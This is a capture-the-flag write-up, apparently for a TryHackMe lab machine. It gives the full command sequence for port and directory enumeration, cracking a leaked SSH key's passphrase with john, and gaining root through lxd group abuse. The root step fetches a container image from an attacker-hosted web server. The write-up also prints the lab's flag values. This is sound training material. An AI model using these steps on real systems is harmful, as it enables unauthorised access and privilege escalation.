 
## A. Enumeration
 
 I started the enumeration phase by running a nmap scan in the start and used below command

```
nmap -sV -sT -A 10.10.74.16
```

Breakdown of the nmap command

-sV - Probe open ports to determine service/version info. I can get the details of services running on the open ports.

-sT - To Run a full connect scan

-A - Enable OS detection, version detection, script scanning, and traceroute

<mark style="background: #ADCCFFA6;">Nmap</mark>

Nmap Output

```
[parrot]─[17:35-25/06]─[/home/glack/Desktop]
└╼glack$nmap -sV -sT -A 10.10.74.16
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-25 17:37 IST
Stats: 0:00:37 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 99.99% done; ETC: 17:38 (0:00:00 remaining)
Nmap scan report for 10.10.74.16
Host is up (0.17s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 340efe0612673ea4ebab7ac4816dfea9 (RSA)
|   256 49611ef4526e7b2998db302d16edf48b (ECDSA)
|_  256 b860c45bb7b2d023a0c756595c631ec4 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: House of danak
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 54.70 seconds
```


nmap showed only port 22 and 80 as open

I also ran all ports scan to check if there are any other open ports 

```
┌[parrot]─[17:38-25/06]─[/home/glack/Desktop]
└╼glack$nmap -T5 -p- 10.10.74.16
```

But there were only 2 open ports i.e. 22 and 80

<mark style="background: #ADCCFFA6;">Port 80 Website</mark>

Website didnt have anything much interesting

![[website.png]]

1. Robots.txt

I found something interesting in the /robots.txt file

![[gamingserver robots.png]]

The "/uploads" directory had 3 files in it

![[gamingserver upload.png]]

I downloaded all three of them using wget

```
[parrot]─[17:41-25/06]─[/home/glack/Desktop/THM/gamingserver]
└╼glack$wget http://10.10.74.16/uploads/dict.lst
```

```
┌[parrot]─[17:41-25/06]─[/home/glack/Desktop/THM/gamingserver]
└╼glack$wget http://10.10.74.16/manifesto.txt
```


```
┌[parrot]─[17:41-25/06]─[/home/glack/Desktop/THM/gamingserver]
└╼glack$wget http://10.10.74.16/meme.jpg
```

After viewing each file, only "dict.lst" seemed to be useful as it contained a wordlist of potential usernames or passwords.

2. Index.html Source code

You can view the source code of a website using the shortcut "CTRL + U" or by right clicking and selecting the "View Source Code" option

In the source code I found an interesting comment at the bottom

![[gamingserver index source code.png]]
We found a potential username "john" on the target machine

3. Directory brute forcing

Till now we had found a potential username" john" in the index.html source code and potential list of passwords "dict.list" in the /uploads directory


To check if there are any other directories I ran a gobuster command 

```
┌[parrot]─[18:31-25/06]─[/home/glack/Desktop/THM/gamingserver]
└╼glack$gobuster dir -u http://10.10.74.16/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```

Breakdown of gobuster command

dir - to run the gobuster in directory brute forcing mode

-u - The URL we want to target

-w - the wordlist we want to use for the attack


After running the command we get another directory to check out

```
uploads              (Status: 301) [Size: 312] [--> http://10.10.74.16/uploads/]
/secret               (Status: 301) [Size: 311] [--> http://10.10.74.16/secret/] 
```

The /secret directory had a password protected ssh key file

![[gamingserver secret.png]]

I downloaded the file using

```
┌[parrot]─[17:41-25/06]─[/home/glack/Desktop/THM/gamingserver]
└╼glack$wget http://10.10.74.16/secret/secretKey
```



## B. Gaining Access


After collecting all the details we can in the Enumeration phase we start using this information to gain access on the target system

Now we have a username "john" and a ssh RSA key file we can use to login to the target system

using this command

```
[parrot]─[17:52-25/06]─[/home/glack/Desktop/THM/gamingserver]
└╼glack$ssh john@10.10.74.16 -i secretKey
```

We get an error of bad permissions, to bypass this all we have to do is change the permissions of the RSA file using

```
[parrot]─[17:44-25/06]─[/home/glack/Desktop/THM/gamingserver]
└╼glack$chmod 600 secretKey
```

You can view more about chmod here[https://www.geeksforgeeks.org/chmod-command-linux/] 

And we run the ssh command again and we are prompted a share passkey 
``
```
Enter passphrase for key 'secretKey':
```

Now the only list of potential passphrase we have is the "dic.lst" file we found

We can use "ssh2john" and "john" to figure out he passphrase


We use the below command

```
[parrot]─[17:50-25/06]─[/home/glack/Desktop/THM/gamingserver]
└╼glack$sudo python2 /usr/share/john/ssh2john.py secretKey > forjohn.txt
```

And run the output file using john and the "dict.lst"

```
[parrot]─[18:46-25/06]─[/home/glack/Desktop/THM/gamingserver]
└╼glack$john forjohn.txt --wordlist=dict.lst
```

And we find the passphrase

```
letmein          (secretKey)
```


We run the ssh command again 

```
┌[parrot]─[17:52-25/06]─[/home/glack/Desktop/THM/gamingserver]
└╼glack$ssh john@10.10.74.16 -i secretKey
```

We enter the passphrase and we get in.

We easily get the user flag

```
john@exploitable:~$ cat user.txt
a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e
```


## C. Privilege Escalation


Once I got into the machine, i tried to look around and find standard methods for privilege escalation(Sudo, SUID, capabilities,cronjobs,nfs)

But didnt find much until i saw this 

```
john@exploitable:/tmp$ id
uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```


Upon further research, I found out that lxd is a Linux container manager, and can be used to escalate my privileges into the target machine

I used this [[https://www.hackingarticles.in/lxd-privilege-escalation/]]
resource to guide me on escalating privilege

I followed the following steps

Downloaded the reference repository and ran the binary
```
git clone  https://github.com/saghul/lxd-alpine-builder.git

cd lxd-alpine-builder

./build-alpine
```


Turned my machine into a webserver using

```

python -m SimpleHTTPServer

```

Downloaded the alpine linux container into the target machine using

```
john@exploitable:/tmp$ wget http://10.17.24.189:8000/alpine-v3.18-x86_64-20230625_1901.tar.gz
```

We import the container into lxc using

```
john@exploitable:/tmp$ lxc image import ./alpine-v3.18-x86_64-20230625_1901.tar.gz --alias myimage
```

Then I'll give the container privileges

Add the root directory as a mount point, and start(ignite) the container


```
lxc init myimage ignite -c security.privileged=true
```

```
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
```

```
lxc start ignite
```

```
lxc exec ignite /bin/sh
```

Now that we have the container running and mounted the root directory path we go into that path

```
cd /mnt/root/root
```


And we get the root flag

```
/mnt/root/root # cat root.txt
2e337b8c9f3aff0c2b3e8d4e6a7c88fc
```

Thank you for reading! This is my first writeup, if this helped you don't forget to follow.

